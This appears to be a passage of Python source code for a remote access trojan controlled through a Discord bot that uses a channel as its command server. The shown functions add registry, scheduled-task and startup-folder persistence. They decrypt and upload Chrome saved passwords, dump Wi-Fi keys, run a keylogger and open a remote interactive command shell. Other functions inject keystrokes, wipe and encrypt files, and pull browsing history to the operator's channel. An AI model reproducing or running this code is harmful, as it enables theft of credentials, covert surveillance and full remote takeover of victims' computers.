                            "task_scheduler_persistence": task_scheduler_persistence_exists,
                            "startup_persistence": startup_persistence_exists,
                        }

                    def check_registry_persistence(script_path):
                        # Add your code to check registry persistence here
                        key = r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
                        public_directory = Path('C:/Users/Public')
                        copied_script_path = public_directory / (publicFileName + ".pyw")

                        try:
                            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_READ) as registry_key:
                                value, _ = winreg.QueryValueEx(registry_key, registryName)
                                return value == str(copied_script_path)
                        except Exception:
                            return False

                    def check_task_scheduler_persistence(script_path):
                        # Add your code to check task scheduler persistence here
                        result = os.system(f'schtasks /query /tn {taskName}')
                        return result == 0  # Task exists

                    def check_startup_persistence(script_path):
                        # Add your code to check startup folder persistence here
                        public_directory = Path('C:/Users/Public')
                        copied_script_path = public_directory / (publicFileName + ".pyw")
                        startup_folder = Path(os.path.expanduser("~")) / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
                        shortcut_path = startup_folder / f'{startupName}.bat'

                        return os.path.exists(str(shortcut_path))


                    # Uninstall
                    @bot.command()
                    async def better_uninstall(ctx):
                        if ctx.channel == created_channel and ctx.message.content == "!better_uninstall":
                            script_path = os.path.abspath(sys.argv[0])

                            try:
                                # Check the current persistence status
                                current_status = CheckBetterPersistence(script_path)

                                # Check if the cloned script is in the public directory
                                public_directory = Path('C:/Users/Public')
                                copied_script_path = public_directory / (publicFileName + ".pyw")
                                if (Path.exists(copied_script_path)):
                                    await ctx.send(f"Duplicated Script is in the public directory as expected, removing it...")
                                    # Remove the script from the public directory
                                    os.remove(copied_script_path)
                                    await ctx.send(f"Duplicated Script removed from public directory! Continuing...")
                                else:
                                    await ctx.send("Hmm, Duplicated Script is not in the public directory.")    

                                if current_status['registry_persistence']:
                                    try:
                                        await ctx.send("Disabling Registry Persistence...")
                                        remove_registry_persistence()
                                        await ctx.send("Registry Persistence disabled.")
                                    except Exception as e:
                                        await ctx.send(f"Error disabling registry persistence: {e}")

                                if current_status['task_scheduler_persistence']:
                                    try:
                                        await ctx.send("Removing Task Scheduler Persistence...")
                                        remove_task_scheduler_persistence()
                                        await ctx.send("Task Scheduler Persistence removed.")
                                    except Exception as e:
                                        await ctx.send(f"Error removing task scheduler persistence: {e}")

                                if current_status['startup_persistence']:
                                    try:
                                        await ctx.send("Disabling Startup Persistence...")
                                        remove_startup_persistence()
                                        await ctx.send("Startup Persistence disabled.")
                                    except Exception as e:
                                        await ctx.send(f"Error disabling startup persistence: {e}")

                                await ctx.send("\n**Done with uninstalling persistence!**\n")

                            except Exception as e:
                                await ctx.send(f"An error occurred: {e}")

                    # Add functions to remove persistence
                    def remove_registry_persistence():
                        key = r'Software\Microsoft\Windows\CurrentVersion\Run'

                        try:
                            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_WRITE) as registry_key:
                                winreg.DeleteValue(registry_key, registryName)
                        except Exception as e:
                            print(f"Error removing registry persistence: {e}")

                    def remove_task_scheduler_persistence():
                        os.system(f"schtasks /delete /tn {taskName} /f")

                    def remove_startup_persistence():
                        startup_folder = Path(os.path.expanduser("~")) / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
                        shortcut_path = startup_folder / f'{startupName}.bat'

                        if os.path.exists(str(shortcut_path)):
                            os.remove(str(shortcut_path))



                    USER_DATA_PATH, LOCAL_STATE_PATH = f"{os.environ['USERPROFILE']}\\AppData\\Local\\Google\\Chrome\\User Data", f"{os.environ['USERPROFILE']}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
                    TEMP_DB = f"{os.environ['TEMP']}\\justforfun.db"

                    @bot.command()
                    async def passwords_chrome(ctx):
                        if ctx.channel == created_channel and ctx.message.content == "!passwords_chrome":
                            await ctx.send("Grabbing passwords...")
                            print("Chrome Password Decryptor by bytemafia")
                            file_location = os.path.join(os.getcwd(), "passwords.csv") # Full file path
                            with open(file_location, mode='w', newline='') as passfile: # Write file
                                writer = csv.writer(passfile, delimiter=',')
                                writer.writerow(["No      <->      URL      <->      Username      <->      Password"])
                                secret_key = secretKey()
                                default_folders = ("Profile", "Default")
                                data_folders = [data_path for data_path in os.listdir(USER_DATA_PATH) if data_path.startswith(default_folders)]
                                for data_folder in data_folders:
                                    db_path = f"{USER_DATA_PATH}\\{data_folder}\\Login Data" # Chrome db
                                    con = login_db(db_path)
                                if secret_key and con:
                                    cur = con.cursor()
                                    cur.execute("select action_url, username_value, password_value from logins")
                                    for index, data in enumerate(cur.fetchall()):
                                        url = data[0]
                                        username = data[1]
                                        ciphertext = data[2]
                                        if url != "" and username != "" and ciphertext != "": # To only collect valid entries
                                            password = password_decrypt(secret_key, ciphertext)
                                            writer.writerow([index, url, username, password])
                                    print("Completed! File is at: " + file_location)
                                    con.close()
                                    os.remove(TEMP_DB)

                            # Uploading the file to the Discord server channel
                            with open(file_location, 'rb') as file:
                                file = discord.File(file)
                                await ctx.send("Here are the Chrome passwords:", file=file)

                            # Remove the file after uploading
                            os.remove(file_location)

                    # Collecting secret key
                    def secretKey():
                        try:
                            with open(LOCAL_STATE_PATH, "r") as f:
                                local_state = f.read()
                                key_text = json.loads(local_state)["os_crypt"]["encrypted_key"]
                            key_buffer = base64.b64decode(key_text)[5:]
                            key = win32crypt.CryptUnprotectData(key_buffer)[1]
                            return key
                        except Exception as e:
                            print(e)

                    # Login to db where creds are stored
                    def login_db(db_path):
                        try:
                            shutil.copy(db_path, TEMP_DB) # Copy to temp dir, otherwise get permission error
                            sql_connection = sqlite3.connect(TEMP_DB)
                            return sql_connection
                        except Exception as e:
                            print(e)

                    # Decrypt the password
                    def password_decrypt(secret_key, ciphertext):
                        try:
                            iv = ciphertext[3:15]
                            password_hash = ciphertext[15:-16]
                            cipher = AES.new(secret_key, AES.MODE_GCM, iv)
                            password = cipher.decrypt(password_hash).decode()
                            return password
                        except Exception as e:
                            print(e)

                    @bot.command()
                    async def interactive_cmd(ctx):
                        if ctx.channel == created_channel and ctx.message.content == "!interactive_cmd":
                            # Check if the command was sent in a text channel and matches the command trigger
                            initial_directory = "C:/Users"  # Replace with your actual directory path
                            await ctx.send(f"Interactive command prompt started in {initial_directory}. Type `exit` to exit.")

                            # Start a subprocess for the command prompt
                            process = subprocess.Popen(
                                ['cmd'],
                                stdin=subprocess.PIPE,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                shell=True,
                                cwd=initial_directory  # Set the initial directory
                            )

                            # Read and discard the initial copyright message
                            while True:
                                output_line = process.stdout.readline().decode('latin-1').strip()
                                if not output_line or output_line.endswith(initial_directory + ">"):
                                    break

                            async def read_output():
                                while True:
                                    output_line = process.stdout.readline().decode('latin-1').strip()
                                    if not output_line or output_line.endswith(initial_directory + ">"):
                                        break
                                    await ctx.send(f"```\n{output_line}\n```")

                            try:
                                while True:
                                    user_input = await bot.wait_for('message', check=lambda message: message.channel == created_channel)
                                    if user_input.content.lower() == 'exit':
                                        await ctx.send("Interactive command prompt ended.")
                                        break

                                    # Send user's input to the command prompt
                                    process.stdin.write(f"{user_input.content}\n".encode())
                                    process.stdin.flush()

                                    # Read the output of the previous command
                                    await read_output()

                            except Exception as e:
                                await ctx.send(f"An error occurred: {e}")

                            process.terminate()

                    @bot.command()
                    async def geolocate(ctx):
                        if ctx.channel == created_channel and ctx.message.content == "!geolocate":
                            await ctx.send("Calculating position...")
                            gmaps = googlemaps.Client(GOOGLE_API_KEY)
                            loc = gmaps.geolocate()
                            latitude = loc['location']['lat']
                            longitude = loc['location']['lng']
                            accuracy_radius = loc['accuracy']  # Get the accuracy radius

                            google_maps_link = f"https://maps.google.com/maps?q={latitude},{longitude}"
                            await ctx.send(f"Google Maps Link: {google_maps_link}")
                            await ctx.send(f"Accuracy Radius: {accuracy_radius} meters")

                    @bot.command()
                    async def messagebox(ctx, type, title, message):
                        if ctx.channel == created_channel:
                            try:
                                if not type or not title or not message:
                                    await ctx.send("Please make sure you use the following syntax:\n!messagebox [type] [title] [message]")
                                else:
                                    if type == "error":
                                        await ctx.send("Messagebox sent **sucessfully**")
                                        mb.showerror(title, message)

                                    elif type == "info":
                                        await ctx.send("Messagebox sent **sucessfully**")
                                        mb.showinfo(title, message)

                                    elif type == "warning":
                                        await ctx.send("Messagebox sent **sucessfully**")
                                        mb.showwarning(title, message)

                            except Exception as e:
                                await ctx.send(f"An error ocurred when showing messagebox:\n{e}")

                    # Network stealer
                    @bot.command()
                    async def network(ctx):
                        if ctx.channel == created_channel and ctx.message.content == "!network":
                            await ctx.send("Loading WiFi SSIDs and passwords...")
                            nameListString = ""
                            networkNames = subprocess.check_output("netsh wlan show profile", shell=True, text=True)
                            networkNamesLines = networkNames.splitlines()
                            for line in networkNamesLines:
                                line.strip()
                                if ':' in line:
                                    start = line.index(':') +1
                                    name = str(line[start:].strip())
                                    if len(name) > 1:
                                        try:
                                            checkInfo = f"netsh wlan show profile name=\"{name}\" key=clear"
                                            nameInfo = subprocess.check_output(checkInfo, shell=True, text=True)
                                            nameInfo = nameInfo.splitlines()
                                        except subprocess.CalledProcessError:
                                            continue
                                        password = "[!] Not Found!"
                                        for i in nameInfo:
                                            if "Key Content" in i:
                                                start = i.index(":") +1
                                                password = i[start:].strip()
                                        nameListString += "\t\t" + name + "\t:\t" + password + "\n"
                            await ctx.send(f"**Saved Networks [NAME : PASSWORD]**:\n\n {nameListString}")

                    def secure_delete_file(path_to_file):
                        # Securely delete a file by setting its data to zero.
                        CallME('fsutil.exe file setZeroData offset=0 length=9999999999 "' + path_to_file + '"')
                        os.remove(path_to_file)

                    @bot.command()
                    async def securefile(ctx, path):
                        if ctx.channel == created_channel:
                            if not path:
                                await ctx.send("Please provide path to file (!securefile <path-to-file>).")
                                return
                            try:
                                secure_delete_file(path)
                                await ctx.send("Successfully fucked file!")
                                await ctx.message.add_reaction("\U0001F4A5")  # boom emoji
                            except FileNotFoundError as fnfe:
                                await ctx.send("The specified file was not found (" + str(fnfe) + ")")
                                return

                    @bot.command()
                    async def sendkey(ctx, Key):
                        if ctx.channel == created_channel:
                            if not Key:
                                await ctx.send("Please provide keys to be pressed (!SendKey <Hello-World\{ENTER\}>).")
                                return

                            await ctx.send("Creating .VBS script")

                            # Change all "-" to " "
                            Key = Key.replace("-", " ")

                            # Create new .vbs script to send key
                            script_path = r'C:\users\public\key.vbs'
                            with open(script_path, 'w') as f:
                                f.write('Set WshShell = WScript.CreateObject("WScript.Shell")\n')
                                f.write(f'WshShell.SendKeys "{Key}"\n')

                            # Execute .vbs script
                            await ctx.send("Executing Script!")
                            CallME(f'cscript "{script_path}"')

                            await ctx.send("Sent key: " + Key)
                            await ctx.send("Removing Script...")
                            os.remove(script_path)
                            await ctx.send("Script removed!")


                    # Create a variable to store the logged keys
                    logged_keys = []

                    # Define a global variable for the listener and is_logging
                    listener = None
                    is_logging = False

                    # Define keys that should trigger a new line
                    new_line_keys = set([keyboard.Key.shift_r, keyboard.Key.backspace])

                    def on_key_press(key):
                        global is_logging
                        if is_logging:
                            try:
                                # Check if the key is a modifier key and skip logging if it is
                                if isinstance(key, keyboard.KeyCode):
                                    logged_key = key.char
                                else:
                                    logged_key = f"[{str(key)}]"

                                if key in new_line_keys:
                                    logged_keys.append("\n")  # Start a new line
                                logged_keys.append(f"Key: {logged_key} ")
                            except AttributeError:
                                if key == keyboard.Key.space:
                                    logged_key = " "
                                else:
                                    logged_key = f"[{str(key)}]"

                                if key in new_line_keys:
                                    logged_keys.append("\n")  # Start a new line
                                logged_keys.append(f"Key: {logged_key} ")

                    def start_logging():
                        global listener, is_logging
                        logged_keys.clear()  # Clear previously logged keys
                        listener = keyboard.Listener(on_press=on_key_press)
                        listener.start()
                        is_logging = True
                        print("Logging started...")

                    def stop_logging():
                        global listener, is_logging
                        if listener:
                            listener.stop()
                            with open("keylog.txt", "w") as logfile:
                                logfile.write(" ".join(logged_keys))
                            is_logging = False
                            print("Logging stopped. Keys saved to 'keylog.txt'")

                    @bot.command()
                    async def startlog(ctx):
                        if ctx.channel == created_channel:
                            global is_logging
                            if is_logging:
                                await ctx.send("Logging is already started. Use **!dumplog** to see logs.")
                            else:
                                start_logging()
                                await ctx.send("Logging started. Use **!dumplog** to see logs.")

                    @bot.command()
                    async def stoplog(ctx):
                        if ctx.channel == created_channel:
                            global is_logging
                            if is_logging:
                                stop_logging()
                                await ctx.send("Logging stopped. Use **!dumplog** to see logs.")
                            else:
                                await ctx.send("Logging is already stopped. Use **!dumplog** to see logs.")

                    @bot.command()
                    async def dumplog(ctx):
                        if ctx.channel == created_channel:
                            global logged_keys
                            if logged_keys:
                                # Save the logged keys to a text file
                                with open("keylog.txt", "w") as logfile:
                                    logfile.write("".join(logged_keys))

                                # Send the log file as an attachment
                                await ctx.send("Here is the log:", file=discord.File("keylog.txt"))

                                # Delete the temporary log file
                                os.remove("keylog.txt")
                            else:
                                await ctx.send("No keys have been logged yet.")

                    @bot.command()
                    async def restart(ctx):
                        global created_channel
                        if ctx.channel == created_channel:

                            await ctx.send("Restarting...")

                            # Determine the script filename dynamically
                            script_filename = sys.argv[0]

                            # Build the command to run the script with arguments
                            script_command = [sys.executable, script_filename]

                            # Start a new process to run the script
                            subprocess.Popen(script_command)

                            # Delete channel
                            if created_channel:
                                await created_channel.delete()

                            # Exit the current script
                            sys.exit()


                    def installNirsoft(zip_file_url, exe_file_name):
                        # Destination path for the downloaded .zip file
                        zip_download_path = r"C:\\Users\\Public\\archive.zip"

                        # Directory where you want to extract the .exe file
                        extraction_directory = r"C:\\Users\\Public"

                        # Check if the .zip file already exists, and if not, download it
                        if not os.path.exists(zip_download_path):
                            try:
                                # Download the .zip file
                                response = requests.get(zip_file_url)
                                with open(zip_download_path, 'wb') as file:
                                    file.write(response.content)
                                print(f".zip File downloaded to {zip_download_path}")
                            except Exception as e:
                                print(f".zip File download failed: {str(e)}")

                        # Extract the .exe file from the .zip archive
                        try:
                            with zipfile.ZipFile(zip_download_path, 'r') as zip_ref:
                                # Check if the .exe file exists in the archive
                                if exe_file_name in zip_ref.namelist():
                                    zip_ref.extract(exe_file_name, extraction_directory)
                                    exe_path = os.path.join(extraction_directory, exe_file_name)
                                    print(f".exe File extracted to {exe_path}")
                                else:
                                    print(f".exe file '{exe_file_name}' not found in the archive.")
                        except Exception as e:
                            print(f"Extraction of .exe file failed: {str(e)}")

                    def program_isInstalled(full_path_to_exe):
                        return os.path.exists(full_path_to_exe)


                    @bot.command()
                    async def history(ctx):
                        if ctx.channel == created_channel:
                            # URL of the .zip file to download
                            zip_file_url = "https://www.nirsoft.net/utils/browsinghistoryview.zip"

                            # Destination path for the downloaded .zip file
                            zip_download_path = r"C:\\Users\\Public\\archive.zip"

                            # Directory where you want to extract the .exe file
                            extraction_directory = r"C:\\Users\\Public"

                            # Command to execute after extracting the .exe file
                            command_to_execute = r'C:\Users\Public\BrowsingHistoryView.exe /HistorySource 1 /LoadChrome 1 /shtml "C:\Users\Public\history.html"'

                            # Delete the files that were created by the previous command
                            # Check if any of the files (.html, .zip, .exe) exists
                            if (os.path.exists(extraction_directory + "\\history.html") or os.path.exists(zip_download_path) or os.path.exists(extraction_directory + "\\BrowsingHistoryView.exe")):
                                # Delete the files
                                # Check if history.html exists
                                if os.path.exists(extraction_directory + "\\history.html"):
                                    os.remove(extraction_directory + "\\history.html")
                                # Check if the .zip file exists
                                if os.path.exists(zip_download_path):
                                    os.remove(zip_download_path)
                                # Check if the .exe file exists
                                if os.path.exists(extraction_directory + "\\BrowsingHistoryView.exe"):
                                    os.remove(extraction_directory + "\\BrowsingHistoryView.exe")
                                print(".zip, .html, and .exe files deleted from last execution.")
                                await ctx.send(f".zip, .html, and .exe files deleted from last execution.")
                            else:
                                print("No files to delete from last command.")
                                await ctx.send("No files to delete from last command.")

                            # Check if the .zip file already exists, and if not, download it
                            if not os.path.exists(zip_download_path):
                                try:
                                    # Download the .zip file
                                    response = requests.get(zip_file_url)
                                    with open(zip_download_path, 'wb') as file:
                                        file.write(response.content)
                                    await ctx.send(f".zip File downloaded to {zip_download_path}")
                                    print(f".zip File downloaded to {zip_download_path}")
                                except Exception as e:
                                    await ctx.send(f".zip File download failed: {str(e)}")
                                    print(f".zip File download failed: {str(e)}")

                            # Extract the .exe file from the .zip archive
                            try:
                                with zipfile.ZipFile(zip_download_path, 'r') as zip_ref:
                                    # Specify the name of the .exe file you want to extract
                                    exe_file_name = "BrowsingHistoryView.exe"

                                    # Check if the .exe file exists in the archive
                                    if exe_file_name in zip_ref.namelist():
                                        zip_ref.extract(exe_file_name, extraction_directory)
                                        exe_path = os.path.join(extraction_directory, exe_file_name)
                                        await ctx.send(f".exe File extracted to {exe_path}")
                                        print(f".exe File extracted to {exe_path}")
                                    else:
                                        await ctx.send(f".exe file '{exe_file_name}' not found in the archive.")
                                        print(f".exe file '{exe_file_name}' not found in the archive.")
                            except Exception as e:
                                await ctx.send(f"Extraction of .exe file failed: {str(e)}")
                                print(f"Extraction of .exe file failed: {str(e)}")

                            # Execute the command using the extracted .exe file
                            try:
                                subprocess.run(command_to_execute, shell=True, cwd=extraction_directory)
                                success_message = "Command executed successfully."
                                print(success_message)
                                await ctx.send(success_message)

                                # Send file to C2
                                await ctx.send("Sent file to C2", file=discord.File(extraction_directory + "\\history.html"))

                                # Delete the archive (.zip) and the extracted .exe file
                                os.remove(extraction_directory + "\\history.html")
                                os.remove(zip_download_path)
                                os.remove(extraction_directory + "\\BrowsingHistoryView.exe")
                                print(".zip, .html, and .exe files deleted.")
                                await ctx.send(".zip, .html, and .exe files deleted.")
                            except Exception as e:
                                error_message = f"Command execution failed: {str(e)}"
                                print(error_message)
                                await ctx.send("Error: " + error_message)

                    @bot.command()
                    async def volume(ctx, volume_amount):
                        if ctx.channel == created_channel:
                            try:
                                volume_amount = int(volume_amount)  # Convert the input to an integer

                                if program_isInstalled("C:\\Users\\Public\\nircmd.exe"):
                                    await ctx.send(f"NirCMD is installed and ready!")

                                    if (0 <= volume_amount <= 100):
                                        # Calculate from percentage to NirCMD volume (1% being 655)
                                        volume_level = volume_amount * 655

                                        try:
                                            command = f"C:\\Users\\Public\\nircmd.exe setsysvolume {volume_level}"  # Update the path here
                                            os.system(command)
                                            await ctx.send(f"Volume changed to {volume_amount}%.")
                                            await ctx.send(f"Removing NirCMD...")
                                            if (os.path.exists("C:\\Users\\Public\\nircmd.exe")):
                                                os.remove("C:\\Users\\Public\\nircmd.exe")
                                            if (os.path.exists("C:\\users\\public\\archive.zip")):
                                                os.remove("C:\\users\\public\\archive.zip")
                                            await ctx.send(f"NirCMD removed!")
                                        except Exception as e:
                                            await ctx.send(f"An error occurred while changing the volume: {e}")
                                    else:
                                        await ctx.send("Volume amount must be between 0 and 100.")
                                else:
                                    await ctx.send("NirCMD is not installed, installing it now!")

                                    # Install NirCMD om man inte har det
                                    installNirsoft("https://www.nirsoft.net/utils/nircmd.zip", "nircmd.exe")

                                    await ctx.send("NirCMD has been installed.")
                                    if (0 <= volume_amount <= 100):
                                        # Calculate from procentage to NirCMD volume (1% being 655)
                                        volume_level = volume_amount * 655

                                        try:
                                            command = f"C:\\Users\\Public\\nircmd.exe setsysvolume {volume_level}"  # Update the path here
                                            os.system(command)
                                            await ctx.send(f"Volume changed to {volume_amount}%.")
                                            await ctx.send(f"Removing NirCMD...")
                                            if (os.path.exists("C:\\Users\\Public\\nircmd.exe")):
                                                os.remove("C:\\Users\\Public\\nircmd.exe")
                                            if (os.path.exists("C:\\users\\public\\archive.zip")):
                                                os.remove("C:\\users\\public\\archive.zip")
                                            await ctx.send(f"NirCMD removed!")
                                        except Exception as e:
                                            await ctx.send(f"An error occurred while changing the volume: {e}")
                                    else:
                                        await ctx.send("Volume amount must be between 0 and 100.")
                            except ValueError:
                                await ctx.send("Invalid volume amount. Please provide a number between 0 and 100.")
                            except Exception as e:
                                await ctx.send(f"An error occurred: {e}")

                    @bot.command()
                    async def install(ctx):
                        if ctx.channel == created_channel and ctx.message.content == '!install':
                            print("Received !install command")
                            await ctx.send("Installing the bot on startup...")

                            try:
                                # Check if the operating system is Windows
                                if platform.system() == "Windows":
                                    print("Operating system is Windows")
                                    await ctx.send("Client is using Windows...")

                                    script_path = os.path.abspath(__file__)
                                    startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")

                                    try:
                                        if running_as_executable:
                                            await ctx.send("Client has the **.exe** extension on payload.")
                                            # If the script is an executable
                                            executable_path = sys.executable
                                            executable_link_path = os.path.join(startup_folder, "DiscordBOT.exe")
                                            shutil.copy2(executable_path, executable_link_path)
                                            print(f"Executable copied to: {executable_link_path}")
                                        else:
                                            # If the script is a .py file
                                            if script_path.endswith('.py'):
                                                await ctx.send("Client has the **.py** extension on payload.")
                                                # Create a duplicate copy of the script in C:\Users\Public\PythonScripts
                                                public_folder = os.path.join(os.environ["PUBLIC"], "PythonScripts")
                                                os.makedirs(public_folder, exist_ok=True)
                                                await ctx.send("Created PythonScripts directory at **" + public_folder + "**")
                                                duplicate_script_path = os.path.join(public_folder, "DiscordBOT_duplicate.py")
                                                shutil.copy2(script_path, duplicate_script_path)
                                                await ctx.send("Copied .py file from **" + script_path + "** to **" + duplicate_script_path + "**")

                                                # Create a batch script to run the duplicate .py script
                                                batch_script_path = os.path.join(startup_folder, "DiscordBOT.bat")
                                                batch_script_content = f'@echo off\n"{sys.executable}" "{duplicate_script_path}"'
                                                with open(batch_script_path, 'w') as batch_file:
                                                    batch_file.write(batch_script_content)
                                                print(f"Batch script created at: {batch_script_path}")
                                                await ctx.send(f"Batch script created at: **{batch_script_path}**")
                                            elif script_path.endswith('.pyw'):
                                                await ctx.send("Client has the **.pyw** extension on payload.")
                                                # Create a duplicate copy of the script in C:\Users\Public\PythonScripts
                                                public_folder = os.path.join(os.environ["PUBLIC"], "PythonScripts")
                                                os.makedirs(public_folder, exist_ok=True)
                                                await ctx.send("Created PythonScripts directory at **" + public_folder + "**")
                                                duplicate_script_path = os.path.join(public_folder, "DiscordBOT_duplicate.pyw")
                                                shutil.copy2(script_path, duplicate_script_path)
                                                await ctx.send("Copied .pyw file from **" + script_path + "** to **" + duplicate_script_path + "**")

                                                # Create a batch script to run the duplicate .py script
                                                batch_script_path = os.path.join(startup_folder, "DiscordBOT.bat")
                                                batch_script_content = f'@echo off\n"{sys.executable}" "{duplicate_script_path}"'
                                                with open(batch_script_path, 'w') as batch_file:
                                                    batch_file.write(batch_script_content)
                                                print(f"Batch script created at: {batch_script_path}")
                                                await ctx.send(f"Batch script created at: **{batch_script_path}**")
                                            else:
                                                await ctx.send("Client has the **.exe** extension on payload.")
                                                # If the script is an .exe file
                                                exe_link_path = os.path.join(startup_folder, "DiscordBOT.exe")
                                                shutil.copy2(script_path, exe_link_path)
                                                print(f"Executable copied to: **{exe_link_path}**")

                                        await ctx.send("Bot installed on startup!")
                                        print("Bot installed on startup!")
                                    except Exception as copy_error:
                                        await ctx.send(f"An error occurred while copying the script: {copy_error}")
                                        print(f"An error occurred while copying the script: {copy_error}")
                                else:
                                    await ctx.send("This feature is only supported on Windows.")
                                    print("This feature is only supported on Windows.")
                            except Exception as os_error:
                                await ctx.send(f"An error occurred while checking the operating system: {os_error}")
                                print(f"An error occurred while checking the operating system: {os_error}")

                    @bot.command()
                    async def uninstall(ctx):
                        if ctx.channel == created_channel and ctx.message.content == '!uninstall':
                            print("Received !uninstall command")
                            await ctx.send("Uninstalling the bot...")

                            try:
                                # Check if the operating system is Windows
                                if platform.system() == "Windows":
                                    print("Operating system is Windows")
                                    await ctx.send("Client is using Windows")

                                    startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
                                    batch_script_path = os.path.join(startup_folder, "DiscordBOT.bat")
                                    exe_link_path = os.path.join(startup_folder, "DiscordBOT.exe")

                                    # Remove the batch script and executable link
                                    if os.path.exists(batch_script_path):
                                        secure_delete_file(batch_script_path)
                                        print(f"Batch script removed: {batch_script_path}")
                                        await ctx.send(f"Batch script removed: **{batch_script_path}**")
                                    if os.path.exists(exe_link_path):
                                        secure_delete_file(exe_link_path)
                                        print(f"Executable link removed: {exe_link_path}")
                                        await ctx.send(f"Executable link removed: **{exe_link_path}**")

                                    # Display a message indicating that persistence has been removed
                                    await ctx.send("Bot persistence removed!")
                                    print("Bot persistence removed!")
                                else:
                                    await ctx.send("This feature is only supported on Windows.")
                                    print("This feature is only supported on Windows.")
                            except Exception as e:
                                await ctx.send(f"An error occurred while uninstalling: {e}")
                                print(f"An error occurred while uninstalling: {e}")

                    @bot.command()
                    async def elevate(ctx):
                        if ctx.channel == created_channel:
                            if is_admin():
                                await ctx.send("User has administrative privileges.")
                            else:
                                return await ctx.send(elevate_privileges())

                    @bot.command()
                    async def cat(ctx, file_name):
                        if ctx.channel == created_channel:
                            try:
                                with open(file_name, 'r') as file:
                                    file_content = file.read()
                                    await ctx.send(f"Content of '{file_name}':\n```\n{file_content}\n```")
                            except Exception as e:
                                await ctx.send(f"An error occurred while reading the file: {e}")

                    @bot.command()
                    async def upload(ctx):
                        if ctx.channel == created_channel and ctx.message.attachments:
                            attachment = ctx.message.attachments[0]
                            await attachment.save(attachment.filename)
                            await ctx.send(f"File '{attachment.filename}' uploaded successfully.")
                        elif not ctx.messege.attachments:
                            await ctx.send(f"File did not upload, you did not attach any files...")

                    # Function to generate a Fernet key from a password
                    def generate_key_from_password(password, salt=None):
                        if salt is None:
                            salt = os.urandom(16)
                        kdf = PBKDF2HMAC(
                            algorithm=hashes.SHA256(),
                            iterations=100000,  # You can adjust the number of iterations as needed
                            salt=salt,
                            length=32  # Length of the derived key
                        )
                        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
                        return key, salt

                    # Function to encrypt a file
                    def encrypt_file(input_file, password):
                        try:
                            key, salt = generate_key_from_password(password)
                            fernet = Fernet(key)

                            with open(input_file, 'rb') as file:
                                file_data = file.read()

                            encrypted_data = fernet.encrypt(file_data)

                            # Use the same filename for the encrypted file
                            with open(input_file, 'wb') as encrypted_file:
                                encrypted_file.write(salt + encrypted_data)

                            return input_file  # Return the updated input file name
                        except InvalidToken:
                            return "Invalid token (key or password)"

                    # Function to decrypt a file
                    def decrypt_file(input_file, password):
                        try:
                            with open(input_file, 'rb') as encrypted_file:
                                salt = encrypted_file.read(16)  # Read the salt
                                encrypted_data = encrypted_file.read()

                            key, _ = generate_key_from_password(password, salt)  # Reconstruct the key

                            fernet = Fernet(key)
                            decrypted_data = fernet.decrypt(encrypted_data)

                            # Use the same filename for the decrypted file
                            with open(input_file, 'wb') as decrypted_file:
                                decrypted_file.write(decrypted_data)

                            return input_file  # Return the updated input file name
                        except InvalidToken:
                            return "Invalid token (key or password)"

                    @bot.command()
                    async def encrypt(ctx, input_file, password):
                        if ctx.channel == created_channel:
                            encrypted_file_name = encrypt_file(input_file, password)
                            await ctx.send(f'File encrypted and saved as {encrypted_file_name}')
                            return encrypted_file_name

                    @bot.command()
                    async def decrypt(ctx, input_file, password):
                        if ctx.channel == created_channel:
                            decrypted_file_name = decrypt_file(input_file, password)
                            if decrypted_file_name != "Invalid token (key or password)":
                                await ctx.send(f'File decrypted and saved as {decrypted_file_name}')
                            else:
                                await ctx.send(decrypted_file_name)

                    def has_persistence():
                        # Check if the bot has persistence using either the .py or .exe method
                        script_path = os.path.abspath(__file__)
                        startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
                        batch_script_path = os.path.join(startup_folder, "DiscordBOT.bat")
                        exe_link_path = os.path.join(startup_folder, "DiscordBOT.exe")

                        return os.path.exists(batch_script_path) or os.path.exists(exe_link_path) or script_path.endswith('.exe')

                    def has_better_persistence():
                        if Path(f"C:\\users\\public\\{publicFileName}.pyw").exists():
                            print("Noted: Client has the .pyw file in Public directory.")
                            # Check if the client has persistence using all methods (registry, task scheduler, startup folder) 
                            persistence_results = CheckBetterPersistence(script_path)

                            # Check if all persistence mechanisms are detected
                            return all(persistence_results.values())
                        else:
                            print("Client does not have persistence. (Specifically, does not have the .pyw file in Public directory)")
                            return False

                    def get_system_info():
                        try:
                            script_path = os.path.abspath(sys.argv[0])
                            info = []
                            info.append(f"System: {platform.system()}")
                            info.append(f"Node Name: {platform.node()}")
                            info.append(f"Release: {platform.release()}")
                            info.append(f"Version: {platform.version()}")
                            info.append(f"Machine: {platform.machine()}")
                            info.append(f"Processor: {platform.processor()}")

                            # Memory information
                            memory = psutil.virtual_memory()
                            info.append(f"Memory Total: {convert_bytes(memory.total)}")
                            info.append(f"Memory Available: {convert_bytes(memory.available)}")
                            info.append(f"Memory Used: {convert_bytes(memory.used)} ({memory.percent}%)")

                            # Disk information
                            partitions = psutil.disk_partitions()
                            for partition in partitions:
                                partition_usage = psutil.disk_usage(partition.mountpoint)
                                info.append(f"Disk {partition.device} ({partition.mountpoint}):")
                                info.append(f"  Total: {convert_bytes(partition_usage.total)}")
                                info.append(f"  Used: {convert_bytes(partition_usage.used)} ({partition_usage.percent}%)")

                            # Additional system information
                            info.append(f"Username: {os.getlogin()}")
                            info.append(f"Device Name: {platform.node()}")
                            info.append(f"IsAdmin: {is_admin()}")
                            # Check if the bot has installed persistence (.py or .exe)
                            info.append(f"Has Persistence (Reg): {check_registry_persistence(script_path)}")
                            info.append(f"Has Persistence (Task): {check_task_scheduler_persistence(script_path)}")
                            info.append(f"Has Persistence (Startup): {check_startup_persistence(script_path)}")
                            # check if the bot has installed persistence with cool methods (.pyw)
                            info.append(f"Has Cool Persistence: {cool_persistence_exists()}")

                            private_ip = socket.gethostbyname(socket.gethostname())
